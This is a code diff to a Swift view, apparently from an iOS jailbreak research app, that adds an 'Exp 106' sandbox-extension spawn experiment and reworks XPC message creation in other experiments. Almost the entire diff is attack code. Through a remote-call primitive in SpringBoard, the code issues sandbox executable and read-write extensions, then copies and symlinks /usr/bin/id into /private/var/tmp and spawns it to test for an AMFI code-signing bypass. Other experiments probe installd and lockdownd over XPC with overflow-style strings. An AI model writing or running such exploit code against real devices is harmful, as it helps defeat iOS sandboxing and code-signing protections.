@@ -1034,6 +1034,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "④b Sandbox Exec Spawn (Exp 106)",
+                    icon: "play.circle.fill",
+                    color: .mint,
+                    label: "SBX Spawn",
+                    action: runExp106SandboxExecSpawn,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -9875,7 +9885,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                              remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
         let xpcDictSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -9885,7 +9895,7 @@ struct AMFIExperimentView: View {
 
         detail += "xpc_connection_create: 0x\(String(format: "%llx", xpcConnect))\n"
         detail += "xpc_connection_resume: 0x\(String(format: "%llx", xpcResume))\n"
-        detail += "xpc_dictionary_create_empty: 0x\(String(format: "%llx", xpcDictCreate))\n"
+        detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n"
         detail += "xpc_send_with_reply_sync: 0x\(String(format: "%llx", xpcSendWithReply))\n\n"
 
         guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
@@ -9910,8 +9920,8 @@ struct AMFIExperimentView: View {
                 // Resume connection
                 RootExecutor.rcallAddr(sb, xpcResume, conn)
 
-                // Create message dictionary (xpc_dictionary_create_empty — no args)
-                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate)
+                // Create message: xpc_dictionary_create(NULL, NULL, 0)
+                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
                 detail += "  message: 0x\(String(format: "%llx", msg))\n"
 
                 if msg != 0 && xpcDictSetStr != 0 {
@@ -9927,24 +9937,15 @@ struct AMFIExperimentView: View {
                     RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyAction, valLoad)
                     RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyCmd, valPersonalize)
 
-                    // Send with reply (safer — we get response back)
-                    // SKIP jika msg=0 untuk hindari respring!
-                    if xpcSendWithReply != 0 && msg != 0 {
-                        let reply = RootExecutor.rcallAddr(sb, xpcSendWithReply, conn, msg)
-                        detail += "  reply: 0x\(String(format: "%llx", reply))\n"
-                        if reply != 0 {
-                            let xpcGetType = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                                                remote_alloc_str(sb, "xpc_get_type"))
-                            if xpcGetType != 0 {
-                                let rtype = RootExecutor.rcallAddr(sb, xpcGetType, reply)
-                                detail += "  reply type: 0x\(String(format: "%llx", rtype))\n"
-                            }
-                        }
-                    } else if xpcSend != 0 && msg != 0 {
+                    // Send fire-and-forget (send_with_reply_sync HANGS → respring!)
+                    // Pakai send_message saja — aman, tidak blocking
+                    if xpcSend != 0 && msg != 0 {
                         RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
-                        detail += "  Sent (no reply)\n"
-                    } else {
-                        detail += "  SKIP send — msg is NULL (would respring)\n"
+                        // Tunggu sebentar untuk response
+                        RootExecutor.rcall(sb, "usleep", 500000) // 0.5s
+                        detail += "  Sent! (fire-and-forget, 0.5s wait)\n"
+                    } else if msg == 0 {
+                        detail += "  SKIP send — msg is NULL\n"
                     }
 
                     RootExecutor.rcall(sb, "free", keyPath)
@@ -10059,6 +10060,7 @@ struct AMFIExperimentView: View {
     private func runExp103InstalldDeserial() { runSBExperiment(label: "Deserial", exp: expInstalldDeserial) }
     private func runExp104LockdowndOverflow() { runSBExperiment(label: "Overflow", exp: expLockdowndOverflow) }
     private func runExp105MSMXPC() { runSBExperiment(label: "MSM XPC", exp: expMSMXPC) }
+    private func runExp106SandboxExecSpawn() { runSBExperiment(label: "SBX Spawn", exp: expSandboxExecSpawn) }
 
     /// Helper: run experiment via SpringBoard RC on background thread
     private func runSBExperiment(label: String, exp: @escaping (RemoteCall) -> ExperimentResult) {
@@ -14046,7 +14048,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+                                             remote_alloc_str(sb, "xpc_dictionary_create"))
         let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -14093,7 +14095,7 @@ struct AMFIExperimentView: View {
         // Send messages with path to our TC
         var gotReply = false
         for i in 0..<5 {
-            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
             guard msg != 0 else { detail += "  msg[\(i)]=NULL\n"; continue }
 
             if xpcSetStr != 0 {
@@ -14214,7 +14216,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+                                             remote_alloc_str(sb, "xpc_dictionary_create"))
         let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -14250,7 +14252,7 @@ struct AMFIExperimentView: View {
         var gotReply = false
 
         for cmd in commands {
-            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
             guard msg != 0 else { continue }
 
             if xpcSetStr != 0 {
@@ -14295,7 +14297,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+                                             remote_alloc_str(sb, "xpc_dictionary_create"))
         let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -14330,7 +14332,7 @@ struct AMFIExperimentView: View {
         var gotReply = false
 
         for probe in probes {
-            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
             guard msg != 0 else { continue }
             if xpcSetStr != 0 {
                 let k = remote_alloc_str(sb, "Request")
@@ -14349,7 +14351,7 @@ struct AMFIExperimentView: View {
         // Probe with medium-length string (128 bytes — safe, just testing)
         detail += "\n=== Medium string probe (128 bytes) ===\n"
         let medStr = String(repeating: "A", count: 128)
-        let msg2 = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+        let msg2 = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
         if msg2 != 0 && xpcSetStr != 0 {
             let k = remote_alloc_str(sb, "Request")
             let v = remote_alloc_str(sb, medStr)
@@ -14393,7 +14395,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+                                             remote_alloc_str(sb, "xpc_dictionary_create"))
         let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSetInt = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -14444,7 +14446,7 @@ struct AMFIExperimentView: View {
         var replyDetails: [(String, UInt64)] = []
 
         for (name, kvPairs) in messageFormats {
-            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
             guard msg != 0 else { continue }
 
             for (key, value) in kvPairs {
@@ -14502,6 +14504,169 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: anyReply, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 106: Sandbox Executable Extension + Spawn
+
+    /// Exp 102 berhasil issue sandbox.executable extension.
+    /// Sekarang test: apakah spawn binary dari path yang di-extend berhasil bypass AMFI?
+    /// Strategy: issue extension → copy binary → spawn dari path tersebut.
+    private func expSandboxExecSpawn(sb: RemoteCall) -> ExperimentResult {
+        let expName = "Sandbox Exec Spawn (Exp 106)"
+        var detail = "Experiment 106: Spawn with Sandbox Executable Extension\n"
+        detail += "=========================================================\n\n"
+        detail += "Exp 102 berhasil: sandbox.executable extension issued!\n"
+        detail += "Test: apakah extension bypass AMFI code signing?\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Step 1: Issue sandbox.executable extension
+        detail += "=== Step 1: Issue sandbox extensions ===\n"
+
+        let sbExtIssue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "sandbox_extension_issue_file"))
+        let sbExtConsume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "sandbox_extension_consume"))
+
+        guard sbExtIssue != 0 && sbExtConsume != 0 else {
+            detail += "❌ sandbox_extension functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Issue executable extension for /private/var/tmp/
+        let extType = remote_alloc_str(sb, "com.apple.sandbox.executable")
+        let paths = [
+            "/private/var/tmp/",
+            "/private/var/containers/Bundle/",
+        ]
+
+        for path in paths {
+            let pathAddr = remote_alloc_str(sb, path)
+            let token = RootExecutor.rcallAddr(sb, sbExtIssue, extType, pathAddr, 0)
+            if token != 0 {
+                let handle = RootExecutor.rcallAddr(sb, sbExtConsume, token)
+                detail += "✅ executable ext: \(path) (handle=\(Int64(bitPattern: handle)))\n"
+            } else {
+                detail += "❌ \(path): no token\n"
+            }
+            RootExecutor.rcall(sb, "free", pathAddr)
+        }
+
+        // Also issue read-write
+        let rwType = remote_alloc_str(sb, "com.apple.app-sandbox.read-write")
+        for path in paths {
+            let pathAddr = remote_alloc_str(sb, path)
+            let token = RootExecutor.rcallAddr(sb, sbExtIssue, rwType, pathAddr, 0)
+            if token != 0 {
+                RootExecutor.rcallAddr(sb, sbExtConsume, token)
+            }
+            RootExecutor.rcall(sb, "free", pathAddr)
+        }
+        RootExecutor.rcall(sb, "free", extType)
+        RootExecutor.rcall(sb, "free", rwType)
+
+        // Step 2: Copy a system binary to /var/tmp (keeps CDHash)
+        detail += "\n=== Step 2: Copy system binary (keeps CDHash) ===\n"
+
+        let srcPath = "/usr/bin/id"
+        let dstPath = "/private/var/tmp/.exp106_id"
+        let srcAddr = remote_alloc_str(sb, srcPath)
+        let dstAddr = remote_alloc_str(sb, dstPath)
+
+        // Remove old
+        RootExecutor.rcall(sb, "unlink", dstAddr)
+
+        // Copy via read/write
+        let srcFd = RootExecutor.rcall(sb, "open", srcAddr, UInt64(O_RDONLY), 0)
+        let dstFd = RootExecutor.rcall(sb, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+
+        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+            let buf = mem + 0x2000
+            var totalCopied: UInt64 = 0
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(sb, "read", srcFd, buf, 4096)
+                if n == 0 || n == UInt64(bitPattern: -1) { break }
+                RootExecutor.rcall(sb, "write", dstFd, buf, n)
+                totalCopied += n
+                if n < 4096 { break }
+            }
+            detail += "Copied \(totalCopied) bytes: \(srcPath) → \(dstPath)\n"
+        } else {
+            detail += "❌ Cannot open src(\(srcFd)) or dst(\(dstFd))\n"
+        }
+        RootExecutor.rcall(sb, "close", srcFd)
+        RootExecutor.rcall(sb, "close", dstFd)
+        RootExecutor.rcall(sb, "chmod", dstAddr, 0o755)
+
+        // Step 3: Spawn from /var/tmp WITH sandbox extension active
+        detail += "\n=== Step 3: Spawn with extension ===\n"
+
+        let (ret1, pid1, err1) = doSpawn(rc: sb, path: dstPath, mem: mem)
+        detail += "posix_spawn(\(dstPath)): ret=\(ret1), pid=\(pid1), errno=\(err1)\n"
+
+        if ret1 == 0 && pid1 != 0 {
+            let (sig, code) = doWait(rc: sb, pid: pid1, mem: mem)
+            detail += "exit: signal=\(sig), code=\(code)\n"
+            if sig != 9 {
+                detail += "\n🎉🎉🎉 NO SIGKILL! Binary executed from /var/tmp!\n"
+                detail += "Sandbox executable extension BYPASSES spawn restriction!\n"
+            } else {
+                detail += "SIGKILL — AMFI still kills (CDHash mismatch after copy)\n"
+            }
+        } else if ret1 == 0 && pid1 == 0 {
+            detail += "ret=0 but pid=0 — spawn failed silently\n"
+        }
+
+        // Step 4: Try symlink approach (keeps original CDHash)
+        detail += "\n=== Step 4: Symlink spawn (preserves CDHash) ===\n"
+
+        let symlinkPath = "/private/var/tmp/.exp106_id_link"
+        let symlinkAddr = remote_alloc_str(sb, symlinkPath)
+        RootExecutor.rcall(sb, "unlink", symlinkAddr)
+        RootExecutor.rcall(sb, "symlink", srcAddr, symlinkAddr)
+
+        let (ret2, pid2, err2) = doSpawn(rc: sb, path: symlinkPath, mem: mem)
+        detail += "posix_spawn(symlink→\(srcPath)): ret=\(ret2), pid=\(pid2), errno=\(err2)\n"
+
+        if ret2 == 0 && pid2 != 0 {
+            let (sig2, code2) = doWait(rc: sb, pid: pid2, mem: mem)
+            detail += "exit: signal=\(sig2), code=\(code2)\n"
+            if sig2 != 9 {
+                detail += "\n🎉 Symlink spawn SUCCESS with sandbox extension!\n"
+            }
+        }
+
+        // Step 5: Try spawn /usr/bin/id directly (should always work)
+        detail += "\n=== Step 5: Direct spawn /usr/bin/id (baseline) ===\n"
+
+        let (ret3, pid3, err3) = doSpawn(rc: sb, path: srcPath, mem: mem)
+        detail += "posix_spawn(\(srcPath)): ret=\(ret3), pid=\(pid3), errno=\(err3)\n"
+
+        if ret3 == 0 && pid3 != 0 {
+            let (sig3, code3) = doWait(rc: sb, pid: pid3, mem: mem)
+            detail += "exit: signal=\(sig3), code=\(code3)\n"
+        }
+
+        // Cleanup
+        RootExecutor.rcall(sb, "unlink", dstAddr)
+        RootExecutor.rcall(sb, "unlink", symlinkAddr)
+        RootExecutor.rcall(sb, "free", srcAddr)
+        RootExecutor.rcall(sb, "free", dstAddr)
+        RootExecutor.rcall(sb, "free", symlinkAddr)
+
+        // Verdict
+        detail += "\n=== VERDICT ===\n"
+        let anySpawnWorked = (ret1 == 0 && pid1 != 0) || (ret2 == 0 && pid2 != 0)
+        if anySpawnWorked {
+            detail += "✅ Spawn berhasil dari /var/tmp dengan sandbox extension!\n"
+            detail += "Cek signal — jika bukan SIGKILL = AMFI bypass!\n"
+        } else {
+            detail += "❌ Spawn gagal — sandbox extension tidak cukup untuk bypass\n"
+            detail += "AMFI check CDHash di kernel level (bukan sandbox level)\n"
+        }
+
+        return ExperimentResult(name: expName, success: anySpawnWorked, detail: detail, timestamp: Date())
     }
 
     
